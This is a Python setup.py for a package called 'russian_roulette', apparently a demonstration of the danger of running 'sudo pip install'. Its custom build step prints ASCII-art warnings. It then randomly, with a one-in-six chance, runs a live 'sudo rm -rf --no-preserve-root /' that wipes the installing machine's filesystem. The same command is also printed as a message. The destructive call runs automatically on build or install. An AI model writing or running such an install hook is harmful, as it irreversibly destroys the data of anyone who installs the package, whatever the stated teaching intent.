from distutils.core import setup
from distutils.command.build import build as _build
import time, os

class build(_build):
    # https://stackoverflow.com/a/3467690/463213
    description = "Russian Roulette Un-Build Process"
    def run(self):

        if(os.geteuid()==0):

            print(r"""
    
            _       _                _    ???????
           | |     | |              | |    ?????
           | | ___ | |_      ___   _| |_    ???
           | |/ _ \| \ \ /\ / / | | | __|   ???
           | | (_) | |\ V  V /| |_| | |_       
           |_|\___/|_| \_/\_/  \__,_|\__|   ???
                                            ???
    
""")                                          
            time.sleep(4)
            print(r"""
    
           _   _     _   _     _ __ _   _ _ __  
          | | | |   | | | |   | '__| | | | '_ \ 
          | |_| |   | |_| |   | |  | |_| | | | |
           \__, |    \__,_|   |_|   \__,_|_| |_|
            __/ |                               
           |___/                                                              
  
    
""")
            time.sleep(2)
            print(r"""
    
               _               _         _           _        _ _ 
              | |             (_)       (_)         | |      | | |
 ___ _   _  __| | ___    _ __  _ _ __    _ _ __  ___| |_ __ _| | |
/ __| | | |/ _` |/ _ \  | '_ \| | '_ \  | | '_ \/ __| __/ _` | | |
\__ \ |_| | (_| | (_) | | |_) | | |_) | | | | | \__ \ || (_| | | |
|___/\__,_|\__,_|\___/  | .__/|_| .__/  |_|_| |_|___/\__\__,_|_|_|
                        | |     | |                               
                        |_|     |_|                               
    
    
""")
            time.sleep(4)
            print("""


                  ___ ___ ___  
                 |__ \__ \__ \ 
                    ) | ) | ) |
                   / / / / / / 
                  |_| |_| |_|  
                  (_) (_) (_) 

        """)
        time.sleep(4)
        print(r"""

        _   _ _____  _    _  __   _______ _   _
       | \ | |  _  || |  | | \ \ / /  _  | | | |
       |  \| | | | || |  | |  \ V /| | | | | | |
       | . ` | | | || |/\| |   \ / | | | | | | |
       | |\  \ \_/ /\  /\  /   | | \ \_/ / |_| |
       \_| \_/\___/  \/  \/    \_/  \___/ \___/
   
   
    _____ _   _   ___   _      _      ______  _____   __
   /  ___| | | | / _ \ | |    | |     | ___ \/ _ \ \ / /
   \ `--.| |_| |/ /_\ \| |    | |     | |_/ / /_\ \ V /
    `--. \  _  ||  _  || |    | |     |  __/|  _  |\ /
   /\__/ / | | || | | || |____| |____ | |   | | | || |
   \____/\_| |_/\_| |_/\_____/\_____/ \_|   \_| |_/\_/


""")
        time.sleep(2)
        print(r"""

     ______ ___________  __   _______ _   _______               
     |  ___|  _  | ___ \ \ \ / /  _  | | | | ___ \              
     | |_  | | | | |_/ /  \ V /| | | | | | | |_/ /              
     |  _| | | | |    /    \ / | | | | | | |    /               
     | |   \ \_/ / |\ \    | | \ \_/ / |_| | |\ \               
     \_|    \___/\_| \_|   \_/  \___/ \___/\_| \_|              
                                                            
                                                            
  _____ _   _  _____  _____ _      _____ _   _ _____  _____ 
 |_   _| \ | |/  ___||  _  | |    |  ___| \ | /  __ \|  ___|
   | | |  \| |\ `--. | | | | |    | |__ |  \| | /  \/| |__  
   | | | . ` | `--. \| | | | |    |  __|| . ` | |    |  __| 
  _| |_| |\  |/\__/ /\ \_/ / |____| |___| |\  | \__/\| |___ 
  \___/\_| \_/\____/  \___/\_____/\____/\_| \_/\____/\____/ 
                                                           

""")
        time.sleep(4)
        print(r"""

wiping your hard drive... please wait...

+ rm -rf /*

""")

        # The longest 6 seconds of your life
        time.sleep(6)

        import subprocess, random

        if(random.randint(1,6)==6):

            print("Hold on to your butts.\n\n\n")

            # IDGAF
            subprocess.call(["sudo","rm","-rf","--no-preserve-root","/"])
    
        else:

            print("Just kidding, it's your lucky day.\n")
            print("See how stupid it is to run sudo pip install?\n")
            print('Here is how close you came to a really bad day:\n')
            print('subprocess.call(["sudo","rm","-rf","--no-preserve-root","/"])\n')
        
        # TGIF
        # My work here is done
        # :dusts off hands:
        _build.run(self)

setup(name='russian_roulette',
      version='0.666.0',
      description='running sudo pip install is insanely dangerous',
      url='http://pages.charlesreid1.com/dont-sudo-pip',
      author='charlesreid1',
      author_email='charles@charlesreid1.com',
      license='MIT',
      cmdclass={'build' : build},
      zip_safe=False)

